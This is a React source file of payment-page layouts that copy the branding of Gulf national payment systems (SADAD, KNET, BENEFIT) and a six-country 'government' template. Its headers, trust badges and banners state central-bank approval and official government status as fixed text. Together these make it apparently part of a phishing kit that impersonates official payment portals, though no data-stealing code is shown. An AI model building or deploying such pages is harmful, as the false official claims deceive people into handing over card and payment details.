import React from 'react';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { governmentPaymentSystems, GovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import {
  Shield,
  Lock,
  CheckCircle2,
  CreditCard,
  Building2,
  Globe,
  Smartphone,
  FileText,
  AlertCircle,
  Clock,
  Eye,
  EyeOff,
  Loader2,
  ChevronLeft,
  ChevronRight,
} from 'lucide-react';

// ═══════════════════════════════════════════════════════════════════════════════
// TYPE DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════════════

interface GovernmentLayoutProps {
  countryCode: string;
  children: React.ReactNode;
  amount?: string;
  serviceName?: string;
  description?: string;
}

interface UnifiedGovernmentLayoutProps {
  countryCode?: string;
  serviceName?: string;
  amount?: string;
  description?: string;
  referenceNumber?: string;
  children?: React.ReactNode;
}

// ═══════════════════════════════════════════════════════════════════════════════
// OFFICIAL GOVERNMENT HEADER
// ═══════════════════════════════════════════════════════════════════════════════

interface GovernmentHeaderProps {
  govSystem: GovernmentPaymentSystem;
  serviceName?: string;
}

const GovernmentHeader: React.FC<GovernmentHeaderProps> = ({ govSystem, serviceName }) => {
  const { colors } = govSystem;

  return (
    <header
      className="relative overflow-hidden"
      style={{
        background: govSystem.gradients.header,
        minHeight: '130px',
      }}
    >
      {/* Decorative background pattern */}
      <div className="absolute inset-0 opacity-[0.07]">
        <svg className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <pattern id="gov-pattern" x="0" y="0" width="60" height="60" patternUnits="userSpaceOnUse">
              <circle cx="30" cy="30" r="28" fill="none" stroke="white" strokeWidth="1" />
              <circle cx="30" cy="30" r="20" fill="none" stroke="white" strokeWidth="0.5" />
              <circle cx="30" cy="30" r="10" fill="none" stroke="white" strokeWidth="0.5" />
            </pattern>
          </defs>
          <rect width="100%" height="100%" fill="url(#gov-pattern)" />
        </svg>
      </div>

      {/* Large decorative circle - top right */}
      <div
        className="absolute -top-12 -right-12 w-48 h-48 rounded-full opacity-10"
        style={{ backgroundColor: 'white' }}
      />

      <div className="container mx-auto px-4 py-6 relative z-10">
        <div className="flex items-center justify-between flex-wrap gap-4">
          {/* Logo + Title */}
          <div className="flex items-center gap-4">
            <div
              className="bg-white p-3 flex items-center justify-center shadow-md"
              style={{ borderRadius: '14px', minWidth: '72px', minHeight: '72px' }}
            >
              {govSystem.logo ? (
                <img
                  src={govSystem.logo}
                  alt={govSystem.nameAr}
                  className="h-12 w-auto object-contain"
                  style={{ maxHeight: '48px' }}
                  onError={(e) => {
                    (e.target as HTMLImageElement).style.display = 'none';
                  }}
                />
              ) : (
                <div
                  className="w-12 h-12 rounded-lg flex items-center justify-center"
                  style={{ background: govSystem.gradients.primary }}
                >
                  <CreditCard className="w-6 h-6 text-white" />
                </div>
              )}
            </div>

            <div className="text-white">
              <h1
                className="text-2xl font-bold leading-tight"
                style={{ fontFamily: 'Cairo, sans-serif' }}
              >
                {serviceName || govSystem.nameAr}
              </h1>
              <p className="text-sm opacity-90 mt-0.5">{govSystem.nameAr}</p>
              <p className="text-xs opacity-70">{govSystem.description}</p>
            </div>
          </div>

          {/* Right side badges */}
          <div className="flex flex-wrap items-center gap-2">
            <Badge
              className="px-4 py-2 text-sm font-medium"
              style={{
                backgroundColor: 'rgba(255,255,255,0.18)',
                color: 'white',
                border: '1px solid rgba(255,255,255,0.25)',
                borderRadius: '10px',
                backdropFilter: 'blur(8px)',
              }}
            >
              <Shield className="w-4 h-4 ml-1.5" />
              دفع حكومي آمن
            </Badge>
            <Badge
              className="px-4 py-2 text-sm font-medium"
              style={{
                backgroundColor: 'rgba(255,255,255,0.12)',
                color: 'white',
                border: '1px solid rgba(255,255,255,0.2)',
                borderRadius: '10px',
              }}
            >
              <Lock className="w-4 h-4 ml-1.5" />
              SSL 256-bit
            </Badge>
          </div>
        </div>
      </div>
    </header>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// TRUST BADGES ROW
// ═══════════════════════════════════════════════════════════════════════════════

interface TrustBadgesProps {
  govSystem: GovernmentPaymentSystem;
}

const TrustBadges: React.FC<TrustBadgesProps> = ({ govSystem }) => {
  const { colors } = govSystem;

  const badges = [
    { icon: Shield, text: 'آمن ومعتمد', desc: ' البنك المركزي' },
    { icon: Lock, text: 'مشفر بالكامل', desc: 'SSL 256-bit' },
    { icon: Globe, text: 'متاح 24/7', desc: 'على مدار الساعة' },
    { icon: CheckCircle2, text: 'فوري', desc: 'تنفيذ لحظي' },
  ];

  return (
    <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-8">
      {badges.map((badge, idx) => (
        <Card
          key={idx}
          className="p-4 text-center hover:shadow-lg transition-all duration-300"
          style={{
            borderRadius: govSystem.borderRadius.lg,
            backgroundColor: colors.surface,
            border: `1px solid ${colors.border}`,
            boxShadow: govSystem.shadows.sm,
          }}
        >
          <div
            className="w-12 h-12 mx-auto rounded-full flex items-center justify-center mb-2"
            style={{ backgroundColor: `${colors.primary}15` }}
          >
            <badge.icon className="w-5 h-5" style={{ color: colors.primary }} />
          </div>
          <p className="font-bold text-sm" style={{ color: colors.text }}>
            {badge.text}
          </p>
          <p className="text-xs mt-0.5" style={{ color: colors.textLight }}>
            {badge.desc}
          </p>
        </Card>
      ))}
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// OFFICIAL FORM INPUT COMPONENT
// ═══════════════════════════════════════════════════════════════════════════════

interface GovInputProps extends React.InputHTMLAttributes<HTMLInputElement> {
  label?: string;
  error?: string;
  hint?: string;
  leftIcon?: React.ReactNode;
  rightIcon?: React.ReactNode;
  countryCode?: string;
}

export const GovInput: React.FC<GovInputProps> = ({
  label,
  error,
  hint,
  leftIcon,
  rightIcon,
  countryCode = 'SA',
  className = '',
  ...props
}) => {
  const govSystem = governmentPaymentSystems[countryCode.toUpperCase()] || governmentPaymentSystems.SA;
  const { colors } = govSystem;
  const hasError = !!error;

  return (
    <div className={`space-y-1.5 ${className}`}>
      {label && (
        <label
          className="block text-sm font-semibold"
          style={{ color: colors.text, fontFamily: 'Cairo, sans-serif' }}
        >
          {label}
          {props.required && <span className="text-red-500 mr-1">*</span>}
        </label>
      )}

      <div className="relative">
        {leftIcon && (
          <div
            className="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none"
            style={{ color: colors.textLight }}
          >
            {leftIcon}
          </div>
        )}

        <input
          {...props}
          className="w-full px-4 py-3 text-sm transition-all duration-200 focus:outline-none focus:ring-2"
          style={{
            borderRadius: govSystem.borderRadius.md,
            border: `1.5px solid ${hasError ? '#EF4444' : colors.border}`,
            backgroundColor: 'white',
            color: colors.text,
            fontFamily: 'Cairo, sans-serif',
            paddingRight: leftIcon ? '40px' : '16px',
            paddingLeft: rightIcon ? '40px' : '16px',
            boxShadow: hasError ? '0 0 0 3px rgba(239, 68, 68, 0.1)' : 'none',
          }}
          onFocus={(e) => {
            e.target.style.borderColor = colors.primary;
            e.target.style.boxShadow = `0 0 0 3px ${colors.primary}20`;
          }}
          onBlur={(e) => {
            e.target.style.borderColor = hasError ? '#EF4444' : colors.border;
            e.target.style.boxShadow = hasError ? '0 0 0 3px rgba(239, 68, 68, 0.1)' : 'none';
          }}
        />

        {rightIcon && (
          <div
            className="absolute left-3 top-1/2 -translate-y-1/2"
            style={{ color: colors.textLight }}
          >
            {rightIcon}
          </div>
        )}
      </div>

      {error && (
        <p className="text-xs flex items-center gap-1" style={{ color: '#EF4444' }}>
          <AlertCircle className="w-3.5 h-3.5" />
          {error}
        </p>
      )}

      {hint && !error && (
        <p className="text-xs" style={{ color: colors.textLight }}>
          {hint}
        </p>
      )}
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// OFFICIAL BRAND BUTTON COMPONENT
// ═══════════════════════════════════════════════════════════════════════════════

interface GovButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
  variant?: 'primary' | 'secondary' | 'outline' | 'ghost';
  size?: 'sm' | 'md' | 'lg';
  loading?: boolean;
  fullWidth?: boolean;
  leftIcon?: React.ReactNode;
  rightIcon?: React.ReactNode;
  countryCode?: string;
}

export const GovButton: React.FC<GovButtonProps> = ({
  variant = 'primary',
  size = 'md',
  loading = false,
  fullWidth = false,
  leftIcon,
  rightIcon,
  countryCode = 'SA',
  children,
  className = '',
  disabled,
  ...props
}) => {
  const govSystem = governmentPaymentSystems[countryCode.toUpperCase()] || governmentPaymentSystems.SA;
  const { colors } = govSystem;

  const sizeClasses = {
    sm: 'px-4 py-2 text-sm',
    md: 'px-6 py-3 text-base',
    lg: 'px-8 py-4 text-lg',
  };

  const getVariantStyles = () => {
    switch (variant) {
      case 'primary':
        return {
          background: govSystem.gradients.primary,
          color: colors.textOnPrimary,
          border: 'none',
          boxShadow: govSystem.shadows.md,
        };
      case 'secondary':
        return {
          backgroundColor: colors.surface,
          color: colors.primary,
          border: `1.5px solid ${colors.primary}`,
          boxShadow: 'none',
        };
      case 'outline':
        return {
          backgroundColor: 'transparent',
          color: colors.primary,
          border: `1.5px solid ${colors.border}`,
          boxShadow: 'none',
        };
      case 'ghost':
        return {
          backgroundColor: 'transparent',
          color: colors.textLight,
          border: 'none',
          boxShadow: 'none',
        };
      default:
        return {};
    }
  };

  const styles = getVariantStyles();

  return (
    <button
      {...props}
      disabled={disabled || loading}
      className={`
        ${sizeClasses[size]}
        ${fullWidth ? 'w-full' : ''}
        rounded-xl font-bold
        flex items-center justify-center gap-2
        transition-all duration-200
        disabled:opacity-50 disabled:cursor-not-allowed
        hover:scale-[1.02] active:scale-[0.98]
        ${className}
      `}
      style={{
        ...styles,
        fontFamily: 'Cairo, sans-serif',
        letterSpacing: '0.01em',
      }}
      onMouseEnter={(e) => {
        if (!disabled && !loading) {
          e.currentTarget.style.opacity = '0.9';
          e.currentTarget.style.boxShadow = govSystem.shadows.lg;
        }
      }}
      onMouseLeave={(e) => {
        e.currentTarget.style.opacity = '1';
        e.currentTarget.style.boxShadow = styles.boxShadow as string || 'none';
      }}
    >
      {loading ? (
        <Loader2 className="w-5 h-5 animate-spin" />
      ) : (
        <>
          {leftIcon && <span className="flex items-center">{leftIcon}</span>}
          {children}
          {rightIcon && <span className="flex items-center">{rightIcon}</span>}
        </>
      )}
    </button>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// OFFICIAL GOVERNMENT FOOTER
// ═══════════════════════════════════════════════════════════════════════════════

interface GovernmentFooterProps {
  govSystem: GovernmentPaymentSystem;
}

const GovernmentFooter: React.FC<GovernmentFooterProps> = ({ govSystem }) => {
  const { colors } = govSystem;
  const year = new Date().getFullYear();

  return (
    <footer
      className="mt-12 pt-6 pb-8"
      style={{
        backgroundColor: `${colors.primary}08`,
        borderTop: `1px solid ${colors.border}`,
      }}
    >
      <div className="container mx-auto px-4">
        {/* Main footer content */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 mb-6">
          <div className="flex items-center gap-3">
            <div
              className="w-10 h-10 rounded-lg flex items-center justify-center"
              style={{ backgroundColor: colors.primary }}
            >
              <Shield className="w-5 h-5" style={{ color: colors.textOnPrimary }} />
            </div>
            <div>
              <p className="font-bold text-sm" style={{ color: colors.text }}>
                {govSystem.nameAr}
              </p>
              <p className="text-xs" style={{ color: colors.textLight }}>
                {govSystem.nameEn}
              </p>
            </div>
          </div>

          <div className="text-center sm:text-center">
            <p className="text-xs" style={{ color: colors.textLight }}>
              نظام دفع إلكتروني حكومي معتمد
            </p>
            <p className="text-xs" style={{ color: colors.textLight }}>
              {govSystem.description}
            </p>
          </div>

          <div className="text-left sm:text-left">
            <div className="flex items-center gap-2 flex-wrap justify-end sm:justify-start">
              {[
                { icon: Lock, text: 'مشفر' },
                { icon: Shield, text: 'معتمد' },
                { icon: Clock, text: '24/7' },
              ].map((item, idx) => (
                <div
                  key={idx}
                  className="flex items-center gap-1 text-xs px-2 py-1 rounded-md"
                  style={{
                    backgroundColor: `${colors.primary}12`,
                    color: colors.primary,
                  }}
                >
                  <item.icon className="w-3.5 h-3.5" />
                  {item.text}
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Copyright */}
        <div
          className="pt-4 text-center"
          style={{
            borderTop: `1px solid ${colors.border}`,
            color: colors.textLight,
          }}
        >
          <p className="text-xs">
            جميع الحقوق محفوظة © {year} — {govSystem.nameAr}
            {govSystem.website && (
              <span className="mr-2">
                |{' '}
                <a
                  href={govSystem.website}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="underline hover:opacity-80 transition-opacity"
                  style={{ color: colors.primary }}
                >
                  {govSystem.website}
                </a>
              </span>
            )}
          </p>
        </div>
      </div>
    </footer>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// SADAD LAYOUT (Saudi Arabia)
// ═══════════════════════════════════════════════════════════════════════════════

export const SADADLayout: React.FC<GovernmentLayoutProps> = ({
  children,
  amount,
  serviceName,
  description,
}) => {
  const govSystem = governmentPaymentSystems.SA;

  return (
    <div
      className="min-h-screen"
      style={{
        backgroundColor: govSystem.colors.surface,
        fontFamily: 'Cairo, sans-serif',
      }}
      dir="rtl"
    >
      <GovernmentHeader govSystem={govSystem} serviceName={serviceName} />

      <main className="container mx-auto px-4 py-8">
        <TrustBadges govSystem={govSystem} />

        <div className="max-w-3xl mx-auto">
          {/* Main payment form card */}
          <Card
            className="p-8 shadow-2xl"
            style={{
              borderRadius: govSystem.borderRadius.xl || '16px',
              backgroundColor: 'white',
              boxShadow: govSystem.shadows.lg,
            }}
          >
            {/* Card header with amount */}
            <div
              className="flex items-center gap-4 mb-6 pb-4"
              style={{
                borderBottom: `2px solid ${govSystem.colors.border}`,
              }}
            >
              <div
                className="w-14 h-14 rounded-xl flex items-center justify-center flex-shrink-0"
                style={{ backgroundColor: `${govSystem.colors.primary}15` }}
              >
                <CreditCard
                  className="w-7 h-7"
                  style={{ color: govSystem.colors.primary }}
                />
              </div>

              <div className="flex-1 min-w-0">
                <h2
                  className="text-2xl font-bold"
                  style={{ color: govSystem.colors.text }}
                >
                  {serviceName || 'بوابة الدفع الحكومية'}
                </h2>
                {description && (
                  <p
                    className="text-sm mt-0.5"
                    style={{ color: govSystem.colors.textLight }}
                  >
                    {description}
                  </p>
                )}
              </div>

              {amount && (
                <div
                  className="px-6 py-3 rounded-xl font-bold text-xl flex-shrink-0"
                  style={{
                    background: govSystem.gradients.primary,
                    color: govSystem.colors.textOnPrimary,
                    borderRadius: '14px',
                  }}
                >
                  {amount}
                </div>
              )}
            </div>

            {children}
          </Card>

          {/* SADAD official info card */}
          <Card
            className="mt-6 p-6"
            style={{
              background: govSystem.gradients.header,
              borderRadius: govSystem.borderRadius.lg || '14px',
              color: govSystem.colors.textOnPrimary,
            }}
          >
            <div className="flex items-center gap-4">
              <Building2 className="w-12 h-12 flex-shrink-0 opacity-90" />
              <div>
                <h3 className="font-bold text-lg mb-1">نظام سداد — SADAD</h3>
                <p className="text-sm opacity-90 leading-relaxed">
                  نظام المدفوعات الوطني السعودي المعتمد من البنك المركزي السعودي (SAMA)
                </p>
              </div>
            </div>
          </Card>
        </div>
      </main>

      <GovernmentFooter govSystem={govSystem} />
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// KNET LAYOUT (Kuwait)
// ═══════════════════════════════════════════════════════════════════════════════

export const KNETLayout: React.FC<GovernmentLayoutProps> = ({
  children,
  amount,
  serviceName,
  description,
}) => {
  const govSystem = governmentPaymentSystems.KW;

  return (
    <div
      className="min-h-screen"
      style={{
        backgroundColor: govSystem.colors.surface,
        fontFamily: 'Cairo, sans-serif',
      }}
      dir="rtl"
    >
      <GovernmentHeader govSystem={govSystem} serviceName={serviceName} />

      <main className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Compact trust badges */}
          <div className="flex flex-wrap gap-2 mb-6">
            {[
              { icon: Shield, text: 'آمن' },
              { icon: Lock, text: 'مشفر' },
              { icon: CheckCircle2, text: 'معتمد' },
              { icon: Globe, text: '24/7' },
            ].map((item, idx) => (
              <Badge
                key={idx}
                className="px-4 py-2 text-sm font-medium"
                style={{
                  backgroundColor: `${govSystem.colors.primary}12`,
                  color: govSystem.colors.primary,
                  border: `1px solid ${govSystem.colors.border}`,
                  borderRadius: '10px',
                }}
              >
                <item.icon className="w-4 h-4 ml-2" />
                {item.text}
              </Badge>
            ))}
          </div>

          {/* Main payment card */}
          <Card
            className="p-8 shadow-2xl"
            style={{
              borderRadius: govSystem.borderRadius.xl || '16px',
              backgroundColor: 'white',
              boxShadow: govSystem.shadows.lg,
            }}
          >
            <div
              className="flex items-center gap-4 mb-6 pb-4"
              style={{
                borderBottom: `2px solid ${govSystem.colors.border}`,
              }}
            >
              <div
                className="w-14 h-14 rounded-xl flex items-center justify-center flex-shrink-0"
                style={{ background: govSystem.gradients.primary }}
              >
                <CreditCard
                  className="w-7 h-7"
                  style={{ color: govSystem.colors.textOnPrimary }}
                />
              </div>

              <div className="flex-1 min-w-0">
                <h2
                  className="text-2xl font-bold"
                  style={{ color: govSystem.colors.text }}
                >
                  {serviceName || 'الدفع عبر كي نت'}
                </h2>
                <p
                  className="text-sm mt-0.5"
                  style={{ color: govSystem.colors.textLight }}
                >
                  {description || 'نظام الدفع الإلكتروني الكويتي'}
                </p>
              </div>

              {amount && (
                <div
                  className="px-5 py-3 rounded-xl flex-shrink-0"
                  style={{
                    backgroundColor: `${govSystem.colors.primary}12`,
                    borderRadius: '14px',
                  }}
                >
                  <p
                    className="text-xs font-semibold"
                    style={{ color: govSystem.colors.primary }}
                  >
                    المبلغ
                  </p>
                  <p
                    className="text-xl font-bold"
                    style={{ color: govSystem.colors.primary }}
                  >
                    {amount}
                  </p>
                </div>
              )}
            </div>

            {children}
          </Card>

          {/* KNET info cards */}
          <div className="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
            <Card
              className="p-4"
              style={{
                backgroundColor: `${govSystem.colors.primary}08`,
                border: `1px solid ${govSystem.colors.border}`,
                borderRadius: govSystem.borderRadius.lg || '14px',
              }}
            >
              <div className="flex items-center gap-3">
                <CheckCircle2
                  className="w-6 h-6 flex-shrink-0"
                  style={{ color: govSystem.colors.primary }}
                />
                <div>
                  <p
                    className="font-bold text-sm"
                    style={{ color: govSystem.colors.text }}
                  >
                    KNET Approved
                  </p>
                  <p
                    className="text-xs"
                    style={{ color: govSystem.colors.textLight }}
                  >
                    معتمد من البنك المركزي الكويتي
                  </p>
                </div>
              </div>
            </Card>

            <Card
              className="p-4"
              style={{
                backgroundColor: `${govSystem.colors.secondary}08`,
                border: `1px solid ${govSystem.colors.border}`,
                borderRadius: govSystem.borderRadius.lg || '14px',
              }}
            >
              <div className="flex items-center gap-3">
                <Smartphone
                  className="w-6 h-6 flex-shrink-0"
                  style={{ color: govSystem.colors.secondary }}
                />
                <div>
                  <p
                    className="font-bold text-sm"
                    style={{ color: govSystem.colors.text }}
                  >
                    WAMD Ready
                  </p>
                  <p
                    className="text-xs"
                    style={{ color: govSystem.colors.textLight }}
                  >
                    الدفع الفوري الجديد
                  </p>
                </div>
              </div>
            </Card>
          </div>
        </div>
      </main>

      <GovernmentFooter govSystem={govSystem} />
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// BENEFIT LAYOUT (Bahrain)
// ═══════════════════════════════════════════════════════════════════════════════

export const BENEFITLayout: React.FC<GovernmentLayoutProps> = ({
  children,
  amount,
  serviceName,
  description,
}) => {
  const govSystem = governmentPaymentSystems.BH;

  return (
    <div
      className="min-h-screen"
      style={{
        backgroundColor: govSystem.colors.surface,
        fontFamily: 'Cairo, sans-serif',
      }}
      dir="rtl"
    >
      <GovernmentHeader govSystem={govSystem} serviceName={serviceName} />

      <main className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Main payment card */}
          <Card
            className="p-8 shadow-2xl"
            style={{
              borderRadius: govSystem.borderRadius.xl || '16px',
              backgroundColor: 'white',
              boxShadow: govSystem.shadows.lg,
            }}
          >
            <div
              className="flex items-center gap-4 mb-6 pb-4"
              style={{
                borderBottom: `2px solid ${govSystem.colors.border}`,
              }}
            >
              <div
                className="w-14 h-14 rounded-xl flex items-center justify-center flex-shrink-0"
                style={{ backgroundColor: govSystem.colors.primary }}
              >
                <CreditCard
                  className="w-7 h-7"
                  style={{ color: govSystem.colors.textOnPrimary }}
                />
              </div>

              <div className="flex-1 min-w-0">
                <h2
                  className="text-2xl font-bold"
                  style={{ color: govSystem.colors.text }}
                >
                  {serviceName || 'BenefitPay'}
                </h2>
                <p
                  className="text-sm mt-0.5"
                  style={{ color: govSystem.colors.textLight }}
                >
                  {description || 'المحفظة الإلكترونية الوطنية'}
                </p>
              </div>

              {amount && (
                <div
                  className="px-6 py-3 rounded-xl font-bold text-xl flex-shrink-0"
                  style={{
                    backgroundColor: govSystem.colors.primary,
                    color: govSystem.colors.textOnPrimary,
                    borderRadius: '14px',
                  }}
                >
                  {amount}
                </div>
              )}
            </div>

            {children}
          </Card>

          {/* BENEFIT secure payment banner */}
          <Card
            className="mt-6 p-6"
            style={{
              background: govSystem.gradients.header,
              borderRadius: govSystem.borderRadius.lg || '14px',
              color: govSystem.colors.textOnPrimary,
            }}
          >
            <div className="flex items-center gap-4">
              <Shield className="w-10 h-10 flex-shrink-0 opacity-90" />
              <div>
                <h3 className="font-bold text-lg mb-1">
                  BENEFIT Secure Payment
                </h3>
                <p className="text-sm opacity-90 leading-relaxed">
                  نظام دفع وطني معتمد من مصرف البحرين المركزي منذ 1997
                </p>
              </div>
            </div>
          </Card>
        </div>
      </main>

      <GovernmentFooter govSystem={govSystem} />
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// UNIFIED GOVERNMENT LAYOUT — ALL 6 COUNTRIES
// ═══════════════════════════════════════════════════════════════════════════════

export const GovernmentLayout: React.FC<UnifiedGovernmentLayoutProps> = ({
  countryCode = 'SA',
  serviceName = '',
  amount = '',
  description = '',
  referenceNumber = '',
  children,
}) => {
  const code = countryCode.toUpperCase();
  const govSystem =
    governmentPaymentSystems[code] || governmentPaymentSystems.SA;
  const { colors } = govSystem;

  return (
    <div
      className="min-h-screen"
      dir="rtl"
      style={{
        backgroundColor: colors.surface,
        fontFamily: 'Cairo, sans-serif',
      }}
    >
      {/* ═══════════════════════════════════════════════════════════ */}
      {/*                    GOVERNMENT OFFICIAL HEADER              */}
      {/* ═══════════════════════════════════════════════════════════ */}
      <header
        className="relative overflow-hidden shadow-lg"
        style={{
          background: govSystem.gradients.header,
          minHeight: '120px',
        }}
      >
        {/* Decorative background pattern */}
        <div className="absolute inset-0 opacity-[0.07]">
          <svg className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <pattern
                id="gov-header-pattern"
                x="0"
                y="0"
                width="60"
                height="60"
                patternUnits="userSpaceOnUse"
              >
                <circle
                  cx="30"
                  cy="30"
                  r="28"
                  fill="none"
                  stroke="white"
                  strokeWidth="1"
                />
                <circle
                  cx="30"
                  cy="30"
                  r="18"
                  fill="none"
                  stroke="white"
                  strokeWidth="0.5"
                />
                <circle
                  cx="30"
                  cy="30"
                  r="8"
                  fill="none"
                  stroke="white"
                  strokeWidth="0.5"
                />
              </pattern>
            </defs>
            <rect width="100%" height="100%" fill="url(#gov-header-pattern)" />
          </svg>
        </div>

        {/* Decorative circles */}
        <div
          className="absolute -top-12 -right-12 w-48 h-48 rounded-full opacity-10"
          style={{ backgroundColor: 'white' }}
        />
        <div
          className="absolute -bottom-6 -left-6 w-32 h-32 rounded-full opacity-5"
          style={{ backgroundColor: 'white' }}
        />

        <div className="container mx-auto px-4 py-6 relative z-10">
          <div className="flex items-center justify-between flex-wrap gap-4">
            {/* Logo + Titles */}
            <div className="flex items-center gap-4">
              <div
                className="bg-white p-3 shadow-md flex items-center justify-center"
                style={{ borderRadius: '14px', minWidth: '72px', minHeight: '72px' }}
              >
                {govSystem.logo ? (
                  <img
                    src={govSystem.logo}
                    alt={govSystem.nameAr}
                    className="h-12 w-auto object-contain"
                    style={{ maxHeight: '48px' }}
                    onError={(e) => {
                      (e.target as HTMLImageElement).style.display = 'none';
                    }}
                  />
                ) : (
                  <div
                    className="w-12 h-12 rounded-lg flex items-center justify-center"
                    style={{ background: govSystem.gradients.primary }}
                  >
                    <CreditCard className="w-6 h-6 text-white" />
                  </div>
                )}
              </div>

              <div className="text-white">
                <h1 className="text-2xl font-bold leading-tight">
                  {serviceName || govSystem.nameAr}
                </h1>
                <p className="text-sm opacity-90">{govSystem.nameAr}</p>
                {description && (
                  <p className="text-xs opacity-75 mt-0.5">{description}</p>
                )}
              </div>
            </div>

            {/* Badges */}
            <div className="flex flex-wrap items-center gap-2">
              {referenceNumber && (
                <Badge
                  className="px-3 py-1.5 text-xs"
                  style={{
                    backgroundColor: 'rgba(255,255,255,0.18)',
                    color: 'white',
                    border: '1px solid rgba(255,255,255,0.25)',
                    borderRadius: '8px',
                  }}
                >
                  <FileText className="w-3.5 h-3.5 ml-1" />
                  {referenceNumber}
                </Badge>
              )}
              <Badge
                className="px-3 py-1.5 text-xs"
                style={{
                  backgroundColor: 'rgba(255,255,255,0.18)',
                  color: 'white',
                  border: '1px solid rgba(255,255,255,0.25)',
                  borderRadius: '8px',
                }}
              >
                <Shield className="w-3.5 h-3.5 ml-1" />
                دفع حكومي آمن
              </Badge>
              <Badge
                className="px-3 py-1.5 text-xs"
                style={{
                  backgroundColor: 'rgba(255,255,255,0.12)',
                  color: 'white',
                  border: '1px solid rgba(255,255,255,0.2)',
                  borderRadius: '8px',
                }}
              >
                <Lock className="w-3.5 h-3.5 ml-1" />
                SSL
              </Badge>
            </div>
          </div>
        </div>
      </header>

      {/* ═══════════════════════════════════════════════════════════ */}
      {/*                          MAIN CONTENT                       */}
      {/* ═══════════════════════════════════════════════════════════ */}
      <main className="container mx-auto px-4 py-8">
        {children}
      </main>

      {/* ═══════════════════════════════════════════════════════════ */}
      {/*                         FOOTER                             */}
      {/* ═══════════════════════════════════════════════════════════ */}
      <footer
        className="py-6 text-center text-sm"
        style={{
          backgroundColor: colors.primary,
          color: colors.textOnPrimary,
        }}
      >
        <div className="container mx-auto px-4">
          <p className="text-xs opacity-90">
            {govSystem.nameAr} — جميع الحقوق محفوظة © {new Date().getFullYear()}
          </p>
        </div>
      </footer>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// GOVERNMENT SECURITY BADGE COMPONENT
// ═══════════════════════════════════════════════════════════════════════════════

interface GovernmentBadgeProps {
  countryCode: string;
}

export const GovernmentSecurityBadge: React.FC<GovernmentBadgeProps> = ({
  countryCode,
}) => {
  const code = countryCode.toUpperCase();
  const govSystem =
    governmentPaymentSystems[code] || governmentPaymentSystems.SA;

  return (
    <Card
      className="p-6 text-white mb-6"
      style={{
        background: govSystem.gradients.primary,
        borderRadius: govSystem.borderRadius.lg || '14px',
      }}
    >
      <div className="flex items-center gap-4">
        <Shield className="w-12 h-12 flex-shrink-0" />
        <div>
          <h3 className="font-bold text-lg mb-1">{govSystem.nameAr}</h3>
          <p className="text-sm opacity-90">{govSystem.description}</p>
        </div>
      </div>

      <div
        className="grid grid-cols-3 gap-3 mt-4 pt-4"
        style={{ borderTop: '1px solid rgba(255,255,255,0.2)' }}
      >
        {[
          { icon: Lock, text: 'تشفير SSL' },
          { icon: CheckCircle2, text: 'معتمد حكومياً' },
          { icon: Building2, text: 'نظام وطني' },
        ].map((item, idx) => (
          <div key={idx} className="text-center">
            <item.icon className="w-5 h-5 mx-auto mb-1 opacity-90" />
            <p className="text-xs font-semibold">{item.text}</p>
          </div>
        ))}
      </div>
    </Card>
  );
};

// ═══════════════════════════════════════════════════════════════════════════════
// LAYOUT SELECTOR HELPER
// ═══════════════════════════════════════════════════════════════════════════════

export const getGovernmentLayout = (countryCode: string) => {
  const code = countryCode.toUpperCase();
  switch (code) {
    case 'SA':
      return SADADLayout;
    case 'KW':
      return KNETLayout;
    case 'BH':
      return BENEFITLayout;
    default:
      return SADADLayout;
  }
};

// ═══════════════════════════════════════════════════════════════════════════════
// EXPORTS
// ═══════════════════════════════════════════════════════════════════════════════

export default {
  SADADLayout,
  KNETLayout,
  BENEFITLayout,
  GovernmentLayout,
  GovernmentSecurityBadge,
  GovernmentHeader,
  GovernmentFooter,
  TrustBadges,
  GovInput,
  GovButton,
  getGovernmentLayout,
};
